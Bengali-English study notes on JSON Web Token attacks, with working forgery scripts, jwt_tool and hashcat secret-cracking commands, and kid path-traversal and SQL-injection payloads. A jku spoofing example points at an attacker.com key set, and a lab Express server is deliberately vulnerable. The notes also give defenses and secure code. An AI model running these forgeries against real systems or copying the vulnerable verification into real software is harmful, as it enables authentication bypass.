# 🔑 JWT — JSON Web Token Attacks — Detailed Study Notes

> **Source:** [PayloadsAllTheThings/JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
> **RFC:** [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519)
> **Audience:** Cybersecurity students, ethical hackers, bug bounty hunters
> **Disclaimer:** শুধুমাত্র authorized system এবং lab environment এ practice করো।

---

## 📚 Table of Contents

1. [Concept — JWT কী এবং কেন?](#1-concept--jwt-কী-এবং-কেন)
2. [JWT Structure — Anatomy](#2-jwt-structure--anatomy)
3. [Algorithms — HS256 vs RS256](#3-algorithms--hs256-vs-rs256)
4. [Signature Attacks](#4-signature-attacks)
   - [None Algorithm Attack (CVE-2015-9235)](#41-none-algorithm-attack-cve-2015-9235)
   - [Null Signature Attack (CVE-2020-28042)](#42-null-signature-attack-cve-2020-28042)
   - [Signature Disclosure (CVE-2019-7644)](#43-signature-disclosure-cve-2019-7644)
   - [RS256 → HS256 Key Confusion (CVE-2016-5431)](#44-rs256--hs256-key-confusion-cve-2016-5431)
   - [Key Injection / JWK Embed (CVE-2018-0114)](#45-key-injection--jwk-embed-cve-2018-0114)
   - [Public Key Recovery from Signed JWTs](#46-public-key-recovery-from-signed-jwts)
5. [JWT Secret Attacks](#5-jwt-secret-attacks)
   - [Secret Brute Force — jwt_tool](#51-secret-brute-force--jwt_tool)
   - [Secret Brute Force — Hashcat](#52-secret-brute-force--hashcat)
6. [JWT Claims Attacks](#6-jwt-claims-attacks)
   - [kid Claim Misuse](#61-kid-claim-misuse)
   - [jku Header Injection (JWKS Spoofing)](#62-jku-header-injection-jwks-spoofing)
7. [Attack Decision Tree](#7-attack-decision-tree)
8. [Practical Lab Setup](#8-practical-lab-setup)
9. [Defense Cheat Sheet](#9-defense-cheat-sheet)
10. [References](#10-references)

---

## 1. Concept — JWT কী এবং কেন?

### Traditional Session vs JWT

```
Traditional Session:
  Login → Server creates session → Stores in DB → Returns session_id cookie

  Next request:
  Cookie: session_id=abc123 → Server checks DB → Who is this? → User#42

  Problem:
    - Server কে session store করতে হয় (stateful)
    - Scalability issue (multiple servers)
    - DB query প্রতি request এ

JWT (Stateless):
  Login → Server creates JWT with user info → Signs it → Returns JWT

  Next request:
  Authorization: Bearer eyJ... → Server verifies SIGNATURE only (no DB!)

  Advantage:
    - Server কে কিছু store করতে হয় না (stateless)
    - Any server verify করতে পারে (scalable)
    - Microservices এ useful
```

### JWT কোথায় পাবে?

```
HTTP Headers:
  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Cookies:
  Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  Cookie: token=eyJ...
  Cookie: auth=eyJ...

URL Parameters:
  https://api.example.com/data?token=eyJ...

localStorage / sessionStorage:
  (Browser DevTools → Application → Storage)
```

---

## 2. JWT Structure — Anatomy

```
JWT Format:
  Base64URL(Header) . Base64URL(Payload) . Base64URL(Signature)
       ↑                     ↑                      ↑
   eyJhbGci...          eyJzdWIi...            UL9Pz5Hb...

Full Example:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  .
  eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFtYXppbmcgSGF4eDByIiwiZXhwIjoiMTQ2NjI3MDcyMiIsImFkbWluIjp0cnVlfQ
  .
  UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY
```

### Part 1: Header

```json
{
  "alg": "HS256",   ← কোন algorithm দিয়ে sign করা হয়েছে
  "typ": "JWT"      ← token type
}
```

```
Base64URL decode করলে পাবে:
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  → {"alg":"HS256","typ":"JWT"}
```

**Important Header Parameters:**

| Parameter | মানে         | Attack Relevance           |
| --------- | ------------ | -------------------------- |
| `alg`     | Algorithm    | `none` attack, RS256→HS256 |
| `kid`     | Key ID       | Path traversal, SQLi       |
| `jku`     | JWK Set URL  | JWKS spoofing              |
| `jwk`     | JSON Web Key | Key injection              |
| `x5u`     | X.509 URL    | Similar to jku             |

### Part 2: Payload (Claims)

```json
{
  "sub": "1234567890",    ← subject (user ID)
  "name": "Amazing Haxx0r",
  "exp": "1466270722",    ← expiration timestamp
  "admin": true           ← custom claim (dangerous!)
}
```

**Standard Claims:**

| Claim | মানে       | Attack Relevance    |
| ----- | ---------- | ------------------- |
| `iss` | Issuer     | Token source        |
| `exp` | Expiration | Modify to extend    |
| `iat` | Issued At  | Timestamp           |
| `nbf` | Not Before | Timing manipulation |
| `jti` | JWT ID     | Replay prevention   |
| `sub` | Subject    | User identifier     |
| `aud` | Audience   | Target validation   |

### Part 3: Signature

```
HMAC-SHA256(
  Base64URL(header) + "." + Base64URL(payload),
  SECRET_KEY
)

ব্যাখ্যা:
  Header + Payload → HMAC function → SECRET_KEY দিয়ে sign → Signature

  Verify: Server একই calculation করে, মিলে গেলে valid!
  Tamper: Payload change করলে signature mismatch → Invalid!

  Attack Goal: Signature validation bypass করা!
```

### Manual Decode (Terminal এ)

```bash
# JWT decode করো:
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.signature"

# Header decode:
echo $TOKEN | cut -d'.' -f1 | base64 -d 2>/dev/null; echo

# Payload decode:
echo $TOKEN | cut -d'.' -f2 | base64 -d 2>/dev/null; echo

# Output:
# {"alg":"HS256","typ":"JWT"}
# {"sub":"1234567890","role":"user"}
```

---

## 3. Algorithms — HS256 vs RS256

```
┌──────────────┬────────────────────────────────────────────────────────┐
│ Algorithm    │ কীভাবে কাজ করে                                        │
├──────────────┼────────────────────────────────────────────────────────┤
│ HS256        │ Symmetric — একটাই secret key                          │
│ (HMAC-SHA256)│ Sign: secret_key দিয়ে                                 │
│              │ Verify: same secret_key দিয়ে                          │
│              │ Problem: secret shared করতে হয়                        │
├──────────────┼────────────────────────────────────────────────────────┤
│ RS256        │ Asymmetric — public/private key pair                   │
│ (RSA-SHA256) │ Sign: PRIVATE key দিয়ে (only server জানে)            │
│              │ Verify: PUBLIC key দিয়ে (সবাই জানতে পারে)            │
│              │ Better for distributed systems                          │
├──────────────┼────────────────────────────────────────────────────────┤
│ none         │ No signature! (Debug purpose)                          │
│              │ DANGEROUS if server accepts this!                       │
└──────────────┴────────────────────────────────────────────────────────┘
```

```
HS256 Key Flow:
  Server                    Client
    │── JWT sign ──────────>│
    │   (secret_key)        │
    │<── JWT sent ──────────│
    │── JWT verify ─────────│
    │   (same secret_key)   │

RS256 Key Flow:
  Server                    Client
    │── JWT sign ──────────>│
    │   (PRIVATE key)       │
    │<── JWT sent ──────────│
    │── JWT verify ─────────│
    │   (PUBLIC key)        │
    │   [public key anyone  │
    │   can have!]          │
```

---

## 4. Signature Attacks

### 4.1 None Algorithm Attack (CVE-2015-9235)

#### Concept

```
JWT spec এ "none" algorithm আছে — debugging এর জন্য।
কিছু libraries এটা accept করে → Signature validation পুরো skip!

Attack:
  Original: {"alg":"HS256"} → tamper payload → wrong signature → REJECTED
  Attack:   {"alg":"none"}  → tamper payload → NO signature needed → ACCEPTED!
```

```
Attack Flow:
┌────────────────────────────────────────────────────────────────┐
│                                                                │
│  Step 1: Original JWT decode করো                              │
│    Header:  {"alg":"HS256","typ":"JWT"}                        │
│    Payload: {"sub":"user123","role":"user","exp":...}          │
│                                                                │
│  Step 2: Header modify করো                                     │
│    Header:  {"alg":"none","typ":"JWT"}  ← algorithm বদলাও!    │
│    Payload: {"sub":"user123","role":"admin","exp":...}         │
│                      ↑ role: user → admin!                     │
│                                                                │
│  Step 3: Re-encode WITHOUT signature                           │
│    Base64URL(new_header) + "." + Base64URL(new_payload) + "." │
│    ↑ শেষে dot আছে কিন্তু signature নেই!                       │
│                                                                │
│  Step 4: Server accepts it → Admin access!                     │
└────────────────────────────────────────────────────────────────┘
```

#### Exploit

```bash
# Method 1: jwt_tool (সবচেয়ে সহজ):
pip install termcolor cprint pycryptodomex requests
python3 jwt_tool.py YOUR_JWT_HERE -X a

# Method 2: Python manually:
import base64, json

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data):
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + '=' * padding)

# Original JWT:
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.signature"

parts = jwt.split('.')

# Decode header and payload:
header = json.loads(b64url_decode(parts[0]))
payload = json.loads(b64url_decode(parts[1]))

print("Original header:", header)
print("Original payload:", payload)

# Modify:
header['alg'] = 'none'          # ← Algorithm change করো
payload['role'] = 'admin'        # ← Role escalate করো

# Re-encode WITHOUT signature:
new_header = b64url_encode(json.dumps(header, separators=(',', ':')))
new_payload = b64url_encode(json.dumps(payload, separators=(',', ':')))

# শেষে dot আছে কিন্তু signature নেই!
forged_jwt = f"{new_header}.{new_payload}."
print("\nForged JWT:", forged_jwt)
```

**None algorithm variants (case bypass):**

```
"alg": "none"
"alg": "None"
"alg": "NONE"
"alg": "nOnE"
"alg": "NoNe"
```

---

### 4.2 Null Signature Attack (CVE-2020-28042)

```
Concept:
  Algorithm HS256 রাখো কিন্তু Signature হিসেবে empty string পাঠাও।
  কিছু vulnerable libraries empty signature accept করে!

Original JWT:
  header.payload.UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY

Null Signature Attack:
  header.payload.    ← Signature empty! (trailing dot only)
```

```bash
# jwt_tool দিয়ে:
python3 jwt_tool.py YOUR_JWT_HERE -X n
```

---

### 4.3 Signature Disclosure (CVE-2019-7644)

```
Concept:
  ভুল signature দিয়ে JWT পাঠালে কিছু server error message এ
  correct signature leak করে!

Exploit:
  1. JWT এর signature টা modify করো (last few chars change করো)
  2. Server এ পাঠাও
  3. Error response দেখো:

  Error: "Invalid signature.
         Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
         got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs"
          ↑ এটাই CORRECT signature leak!

Real CVE:
  jwt-dotnet/jwt library এই mistake করেছিল!
  Auth0-WCF-Service-JWT তেও same issue ছিল।
```

---

### 4.4 RS256 → HS256 Key Confusion (CVE-2016-5431)

#### Concept — এটা সবচেয়ে genius attack!

```
RS256 system:
  Server signs with:   PRIVATE key (secret)
  Server verifies with: PUBLIC key (everyone can have this)

Attack insight:
  Public key → সবাই জানতে পারে!
  HS256 → একটাই key দিয়ে sign + verify করে

  যদি server কোড এভাবে লেখা থাকে:
    if alg == "RS256":
      verify(token, public_key)
    elif alg == "HS256":
      verify(token, public_key)  ← Bug! HS256 এও public_key use!

  Attacker কী করে:
    1. Public key বের করো (often publicly available!)
    2. Algorithm RS256 → HS256 বদলাও
    3. Public key দিয়েই HS256 sign করো
    4. Server verify করবে public_key দিয়ে → Match! ✅
```

```
Normal RS256 Flow:
  Server signs:   HMAC(data, PRIVATE_KEY) ← attacker জানে না
  Server verifies: HMAC(data, PUBLIC_KEY)

Confused HS256 Flow:
  Attacker signs: HMAC(data, PUBLIC_KEY) ← attacker জানে!
  Server verifies: HMAC(data, PUBLIC_KEY) ← matches!
                                ↑ Same key! Bypass!
```

#### Public Key কোথায় পাবে?

```bash
# Method 1: JWKS endpoint থেকে:
curl https://target.com/jwks.json
curl https://target.com/.well-known/jwks.json
# Response: {"keys":[{"kty":"RSA","e":"AQAB","n":"...","kid":"..."}]}

# Method 2: TLS certificate থেকে (same key use করলে):
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem

# Method 3: API documentation, GitHub, etc.
```

#### Exploit

```bash
# Method 1: jwt_tool
python3 jwt_tool.py YOUR_JWT -X k -pk public.pem

# Method 2: Manual steps:

# Step 1: Public key কে hex এ convert করো:
cat public.pem | xxd -p | tr -d "\n"
# Output: 2d2d2d2d2d424547494e...

# Step 2: Header edit করো (RS256 → HS256), payload edit করো (role: admin)
# New header base64url: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
# New payload base64url: eyJpZCI6IjIzIiwicm9sZSI6ImFkbWluIn0

# Step 3: HMAC-SHA256 generate করো public key hex দিয়ে:
echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwicm9sZSI6ImFkbWluIn0" | \
  openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e...

# Step 4: Hex signature → Base64URL
python3 -c "
import base64, binascii
sig_hex = 'YOUR_HEX_SIGNATURE_HERE'
sig_bytes = binascii.a2b_hex(sig_hex)
sig_b64 = base64.urlsafe_b64encode(sig_bytes).rstrip(b'=').decode()
print(sig_b64)
"

# Step 5: Final forged JWT:
# eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwicm9sZSI6ImFkbWluIn0.SIGNATURE
```

---

### 4.5 Key Injection / JWK Embed (CVE-2018-0114)

#### Concept

```
JWT header এ "jwk" parameter আছে যেটা verification এর জন্য public key embed করতে পারে।

Normal:
  Server এর নিজের key দিয়ে verify করে।

Vulnerable:
  Server header এর jwk field trust করে → সেটা দিয়ে verify করে!

Attack:
  1. Attacker নিজের RSA key pair বানায়
  2. JWT header এ নিজের PUBLIC key embed করে (jwk field এ)
  3. নিজের PRIVATE key দিয়ে sign করে
  4. Server → jwk field থেকে public key নেয় → verify করে → Match! ✅
```

```json
Malicious JWT Header:
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "kid": "jwt_tool",
    "use": "sig",
    "e": "AQAB",
    "n": "uKBGiwYqpqP...UGLQ"
    ↑ Attacker এর own public key!
  }
}
```

#### Exploit

```bash
# jwt_tool দিয়ে (সবচেয়ে সহজ):
python3 jwt_tool.py YOUR_JWT -X i

# Burp JWT Editor দিয়ে:
# 1. Extensions → JWT Editor → Keys → New RSA Key
# 2. JWT Repeater tab → Edit payload (role: admin)
# 3. Attack → Embedded JWK
# 4. Send → Check response!
```

---

### 4.6 Public Key Recovery from Signed JWTs

```
Concept:
  RS256/RS384/RS512 তে mathematical property আছে:
  2টা different signed JWT থেকে PUBLIC KEY compute করা যায়!

  Attack:
    1. Valid JWT ২টা collect করো (same private key দিয়ে signed)
    2. jws2pubkey tool দিয়ে public key বের করো
    3. সেই public key দিয়ে RS256→HS256 attack করো!
```

```bash
# jws2pubkey tool:
docker run -it ttervoort/jws2pubkey JWT1 JWT2

# অথবা files থেকে:
docker run -it ttervoort/jws2pubkey "$(cat jwt1.txt)" "$(cat jwt2.txt)" | tee pubkey.jwk

# Output:
# {"kty": "RSA", "n": "sEFRQzskiSOrUY...", "e": "AQAB"}
# → এই public key দিয়ে RS256→HS256 attack করো!
```

---

## 5. JWT Secret Attacks

### 5.1 Secret Brute Force — jwt_tool

```bash
# jwt_tool install:
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install termcolor cprint pycryptodomex requests

# Step 1: JWT inspect করো:
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI

# Step 2: Secret brute force করো:
python3 jwt_tool.py JWT_HERE -d /usr/share/wordlists/rockyou.txt -C
# -d: dictionary file
# -C: crack mode

# Common JWT secrets wordlist:
# https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
# অনেক app এ default secrets পাওয়া যায়:
#   "secret", "password", "jwt_secret", "change_this", "your_secret_key"
```

```bash
# Secret পাওয়ার পরে — Payload edit করো:
python3 jwt_tool.py JWT_HERE -T
# Interactive mode:
#   Current value of role is: user
#   New value: admin
#   [Select field to edit → 0 to continue]
#   [Sign with known key → enter: secret]
# Output: New forged token!
```

### 5.2 Secret Brute Force — Hashcat

```bash
# Hashcat — অনেক দ্রুত! (GPU acceleration)
# Mode 16500 = JWT

# Step 1: JWT কে file এ save করো:
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI" > jwt.txt

# Step 2: Dictionary attack:
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Step 3: Rule-based (mutations):
hashcat -a 0 -m 16500 jwt.txt passwords.txt -r /usr/share/hashcat/rules/best64.rule

# Step 4: Brute force (8 chars, mixed case):
hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6

# Speed: ~365 MH/s on GTX 1080 (millions per second!)

# Result দেখো:
hashcat -a 0 -m 16500 jwt.txt wordlist.txt --show
# Output: JWT:secret_key_found
```

---

## 6. JWT Claims Attacks

### 6.1 kid Claim Misuse

#### Concept

```
"kid" (Key ID) = JWT header এ বলে দেওয়া হয় কোন key দিয়ে verify করতে হবে।

Normal usage:
  Server database/filesystem থেকে kid দিয়ে key lookup করে।

Vulnerable usage:
  Server directly kid value কে file path বা query হিসেবে use করে!
```

#### Attack Type 1 — Path Traversal via kid

```json
// Normal:
{"alg":"HS256","typ":"JWT","kid":"secret.key"}
// Server: reads /keys/secret.key → uses as HMAC key

// Attack: Path traversal!
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}
// Server: reads /dev/null → empty string!
// Sign JWT with empty string "" as secret → works!
```

```bash
# jwt_tool দিয়ে:
python3 jwt_tool.py JWT_HERE -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# -I: inject mode
# -hc kid: header claim "kid" change করো
# -hv: new value
# -S hs256: sign with hs256
# -p "": empty string as secret

# আরেকটা predictable content ফাইল:
python3 jwt_tool.py JWT_HERE -I -hc kid -hv "/proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
# /proc/sys/kernel/randomize_va_space এর content = "2"
# তাহলে secret = "2" দিয়ে sign করো!
```

#### Attack Type 2 — Remote File via kid

```json
// kid as URL:
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "http://localhost:7070/privKey.key"
}
// Server এই URL fetch করে key নেয় → SSRF!
// Attacker নিজের server এ custom key রাখলে control পায়!
```

#### Attack Type 3 — SQL Injection via kid

```json
// kid এ SQL injection:
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "' UNION SELECT 'attacker_secret' -- "
}
// Server: SELECT key FROM keys WHERE kid = '...' SQL করলে
// Injection → 'attacker_secret' return হয়!
// তাহলে "attacker_secret" দিয়ে sign করলে verify হবে!
```

```bash
# jwt_tool fuzzing:
python3 jwt_tool.py JWT_HERE -I -hc kid -hv custom_sqli_vectors.txt
```

---

### 6.2 jku Header Injection (JWKS Spoofing)

#### Concept

```
"jku" = JWK Set URL → Server এই URL থেকে public keys download করে verify করে।

Normal:
  {"jku": "https://legitimate-server.com/jwks.json"}
  Server → fetches this URL → gets public keys → verifies JWT

Attack:
  {"jku": "https://ATTACKER.com/jwks.json"}
  Server → fetches ATTACKER's URL → gets ATTACKER's public keys!
  → Attacker এর private key দিয়ে signed JWT verify হয়!
```

#### Attack Steps

```
Step 1: Attacker নিজের RSA key pair বানায়
  → private.pem (signing এর জন্য)
  → public.pem (JWKS তে রাখার জন্য)

Step 2: JWKS format এ public key host করো:
  https://attacker.com/jwks.json

Step 3: JWT header এ jku বদলাও:
  {"typ":"JWT","alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"YOUR_KID"}

Step 4: Attacker এর private key দিয়ে sign করো

Step 5: Server:
  jku দেখে → attacker.com থেকে JWKS fetch করে
  → attacker এর public key দিয়ে verify → Match! ✅
```

```bash
# JWKS file বানাও (attacker এর server এ):
# jwks.json format:
cat << 'EOF' > jwks.json
{
  "keys": [
    {
      "kid": "beaefa6f-8a50-42b9-805a-0ab63c3acc54",
      "kty": "RSA",
      "e": "AQAB",
      "n": "YOUR_PUBLIC_KEY_N_VALUE_HERE"
    }
  ]
}
EOF

# Python দিয়ে RSA key generate করো:
python3 << 'EOF'
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import base64, json

# Generate key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)
public_key = private_key.public_key()

# Get public numbers for JWKS
pub_numbers = public_key.public_key().public_numbers()

def int_to_base64url(n):
    length = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()

jwks = {
    "keys": [{
        "kty": "RSA",
        "kid": "my-key-id",
        "use": "sig",
        "alg": "RS256",
        "e": int_to_base64url(pub_numbers.e),
        "n": int_to_base64url(pub_numbers.n)
    }]
}
print(json.dumps(jwks, indent=2))
EOF

# jwt_tool দিয়ে exploit:
python3 jwt_tool.py JWT_HERE -X s
python3 jwt_tool.py JWT_HERE -X s -ju http://attacker.com/jwks.json

# JWKS endpoints check করো target এ:
curl https://target.com/jwks.json
curl https://target.com/.well-known/jwks.json
curl https://target.com/openid/connect/jwks.json
curl https://target.com/api/keys
```

---

## 7. Attack Decision Tree

```
JWT পেলাম — কী করবো?
│
├── Step 1: Decode করো (jwt.io বা jwt_tool)
│   → Header এ alg কী?
│   → Payload এ কী claims আছে? (role, admin, user_id)
│
├── Step 2: None Algorithm Test
│   alg → "none" করো, payload modify করো, signature remove করো
│   → কাজ করলো? → Admin access!
│
├── Step 3: Null Signature Test
│   Same alg, payload modify, empty signature পাঠাও
│   → কাজ করলো? → Admin access!
│
├── Step 4: Weak Secret Test
│   → hashcat বা jwt_tool দিয়ে brute force
│   → Secret পেলে? → Re-sign with admin role!
│
├── Step 5: RS256→HS256 Confusion (যদি alg=RS256)
│   → Public key খোঁজো (jwks.json, TLS cert)
│   → Public key দিয়ে HS256 sign করো
│   → কাজ করলো? → Admin access!
│
├── Step 6: Key Injection (jwk header)
│   → নিজের key pair বানাও
│   → jwk field এ embed করো
│   → কাজ করলো? → Admin access!
│
├── Step 7: jku Injection
│   → নিজের JWKS server host করো
│   → jku বদলাও attacker server এ
│   → কাজ করলো? → Admin access!
│
├── Step 8: kid Misuse
│   → Path traversal: kid="../../dev/null" + empty secret
│   → SQL injection: kid="' UNION SELECT 'secret'--"
│   → কাজ করলো? → Admin access!
│
└── Step 9: Signature Disclosure
    → Wrong signature পাঠাও → Error message তে correct signature?
```

---

## 8. Practical Lab Setup

### Lab 1: PortSwigger JWT Labs (Free, Best Practice!)

```
✅ JWT authentication bypass via unverified signature
   → Signature কে verify না করলে payload directly trust করা

✅ JWT authentication bypass via flawed signature verification
   → None algorithm accept করে

✅ JWT authentication bypass via weak signing key
   → Hashcat দিয়ে secret crack

✅ JWT authentication bypass via jwk header injection
   → Embedded JWK attack

✅ JWT authentication bypass via jku header injection
   → JWKS spoofing attack

✅ JWT authentication bypass via kid header path traversal
   → kid এ ../../dev/null attack

URLs: https://portswigger.net/web-security/jwt
```

### Lab 2: Root Me JWT Challenges

```
✅ JWT - Introduction
✅ JWT - Revoked token
✅ JWT - Weak secret
✅ JWT - Unsecure File Signature
✅ JWT - Public key
✅ JWT - Header Injection
✅ JWT - Unsecure Key Handling

URL: https://www.root-me.org
```

### Lab 3: নিজে বানাও — Vulnerable JWT API

```bash
mkdir jwt-lab && cd jwt-lab
npm init -y
npm install express jsonwebtoken

cat > server.js << 'EOF'
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();
app.use(express.json());

const SECRET = 'secret';  // ← Weak secret!

// Login
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'user' && password === 'pass') {
    const token = jwt.sign({ sub: username, role: 'user' }, SECRET);
    res.json({ token });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

// Protected route — VULNERABLE: algorithm not validated!
app.get('/admin', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  try {
    // ❌ BUG: algorithms not specified → accepts "none"!
    const decoded = jwt.verify(token, SECRET);
    if (decoded.role === 'admin') {
      res.json({ message: 'Welcome Admin!', secret: 'FLAG{jwt_pwned}' });
    } else {
      res.status(403).json({ error: 'Not admin' });
    }
  } catch (e) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

app.listen(3000, () => console.log('JWT Lab: http://localhost:3000'));
EOF

node server.js
```

```bash
# Step 1: Login করো:
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}'
# Response: {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 2: Normal access (403):
curl http://localhost:3000/admin \
  -H "Authorization: Bearer $TOKEN"

# Step 3: None algorithm attack:
python3 jwt_tool.py $TOKEN -X a
# Copy the forged token

# Step 4: With forged token:
curl http://localhost:3000/admin \
  -H "Authorization: Bearer FORGED_TOKEN_HERE"
# Response: {"message":"Welcome Admin!","secret":"FLAG{jwt_pwned}"}
```

---

## 9. Defense Cheat Sheet

```
Attack                        → Fix
────────────────────────────────────────────────────────────────────────────
None Algorithm                → Explicitly specify allowed algorithms:
                                jwt.verify(token, secret, {algorithms: ['HS256']})
                                NEVER accept "none"

Weak Secret                   → Strong random secret (256-bit minimum):
                                require('crypto').randomBytes(32).toString('hex')
                                Never use: "secret", "password", "jwt"

RS256→HS256 Confusion         → Algorithm whitelist enforce করো
                                if (header.alg !== 'RS256') reject()

Key Injection (jwk header)    → jwk, jku, x5u headers trust করো না
                                Server এর own keys use করো

jku Header Injection           → jku header accept করো না
                                অথবা allowlist: only your own domain

kid Path Traversal             → kid validate করো (alphanumeric only)
                                parameterized DB query use করো

Null Signature                 → Signature empty হলে reject করো
                                Length check করো

Expired Token Reuse            → exp claim always validate করো
                                Clock skew: max 60 seconds

Token Replay                   → jti claim implement করো
                                Used tokens blacklist এ রাখো
```

### Secure JWT Implementation (Node.js)

```javascript
const jwt = require('jsonwebtoken')
const crypto = require('crypto')

// ✅ Strong secret (256-bit random):
const SECRET = crypto.randomBytes(32).toString('hex')

// ✅ Token creation with expiry:
function createToken(userId, role) {
  return jwt.sign({ sub: userId, role: role }, SECRET, {
    algorithm: 'HS256',
    expiresIn: '1h', // Always set expiry!
    jwtid: crypto.randomUUID(), // Unique ID (anti-replay)
  })
}

// ✅ Secure verification:
function verifyToken(token) {
  try {
    return jwt.verify(token, SECRET, {
      algorithms: ['HS256'], // ← Only HS256! No "none"!
      complete: true, // Full decoded object
    })
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      throw new Error('Token expired')
    }
    throw new Error('Invalid token')
  }
}

// ✅ Middleware:
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' })
  }

  const token = authHeader.split(' ')[1]
  try {
    const decoded = verifyToken(token)
    req.user = decoded.payload
    next()
  } catch (err) {
    res.status(401).json({ error: err.message })
  }
}
```

---

## 10. References

| Resource                         | Link                                                                                         |
| -------------------------------- | -------------------------------------------------------------------------------------------- |
| PayloadsAllTheThings             | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token) |
| jwt_tool                         | [GitHub](https://github.com/ticarpi/jwt_tool)                                                |
| JWT.io (Debugger)                | [jwt.io](https://jwt.io)                                                                     |
| PortSwigger JWT Labs             | [Web Security Academy](https://portswigger.net/web-security/jwt)                             |
| RFC 7519 (JWT Spec)              | [IETF](https://www.rfc-editor.org/rfc/rfc7519)                                               |
| Critical JWT Vulnerabilities     | [Auth0 Blog](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)   |
| jws2pubkey (Public Key Recovery) | [GitHub](https://github.com/SecuraBV/jws2pubkey)                                             |
| Hashcat JWT Mode                 | [Hashcat](https://hashcat.net)                                                               |
| IANA JWT Claims                  | [IANA](https://www.iana.org/assignments/jwt/jwt.xhtml)                                       |

---

> ✅ **Next Topic Suggestions:**
>
> - `OAuth Misconfiguration/README.md` — JWT এর সাথে closely related
> - `Account Takeover/README.md` — JWT bypass → ATO chain
> - `SQL Injection/README.md` — kid claim এ SQLi
> - `SSRF/README.md` — kid/jku এ SSRF

> ⚠️ **Ethical Reminder:** JWT attack testing শুধুমাত্র authorized pentest, Bug Bounty scope, বা নিজের lab এ করো।
